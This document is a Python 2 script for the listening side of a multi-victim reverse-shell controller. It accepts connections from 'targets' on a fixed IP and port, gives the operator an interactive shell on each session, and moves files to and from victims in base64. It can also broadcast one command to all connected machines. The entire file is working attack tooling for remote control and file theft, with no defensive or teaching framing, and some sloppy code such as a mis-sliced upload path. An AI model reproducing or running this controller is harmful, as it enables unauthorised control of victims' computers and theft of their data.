#!/usr/bin/python
import socket
import json
import os
import base64
import threading


def send_all(target,data):
                json_data = json.dumps(data)
                target.send(json_data)



def shell(target,ip):
	def reliable_send(data):
        	json_data = json.dumps(data)
        	target.send(json_data)

	def reliable_recv():
        	data=""
        	while True:
                	try:
                        	data = data + target.recv(1024)
                       		return json.loads(data)
                	except ValueError:
                        	continue

        while True:
                command = raw_input("Shell#~%s"%str(ip))
                reliable_send(command)
                if command =='q':
                        break
		elif command =="exit":
			target.close()
			targets.remove(target)
			ips.remove(ip)
			break
                elif command[:2] =='cd'and len(command)>1:
                        continue
                elif command[:8] == "download":
                        with open(command[9:]+"_copy","wb") as file:
                                file_data = reliable_recv()
                                file.write(base64.b64decode(file_data))
                elif command[:6] == "upload":
                        try:
                                with open(command[:7],"rb") as fin:
                                        reliable_send(base64.b64encode(fin.read()))
                        except:
                                failed = "failed to upload"
                                reliable_send(base64.b64encode(failed))
                else :

                        message = reliable_recv()
                        print(message)



def server():
	global clients
	while True:
		if stop_threads:
			break
		s.settimeout(1)
		try:
			target,ip = s.accept()
			targets.append(target)
			ips.append(ip)
			print(str(targets[clients]) + "..."+str(ips[clients])+"has connected")
			clients +=1
		except:
			pass

global s
ips =[]
targets =[]

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

s.bind(("192.168.43.47",54321))
s.listen(5)

clients = 0
stop_threads = False
print("[+] waiting for target to connect")
t1 = threading.Thread(target = server)
t1.start()

while True:
	command = raw_input("Center: ")
	if command == "targets":
		count =0
		for ip in ips:
			print("session" + str(count) + "<--->"+str(ip))
			count +=1
	elif command[:7] == "session":
		try:
			num = int(command[8:])
			tarnum = targets[num]
			tarip = ips[num]
			shell(tarnum,tarip)
		except:
			print("[+]No session with that IP")
	elif command =="exit":
		for target in targets:
			target.close()
		s.close()
		stop_threads = True
		t1.join()
		break
	elif command[:7] == "sendall":
		length_of_targets = len(targets)
		i =0
		try:
			while i<length_of_targets:
				tarnumber = targets[i]
				print(tarnumber)
				send_all(tarnumber,command)
				i +=1
		except:
			print("cant send to all")
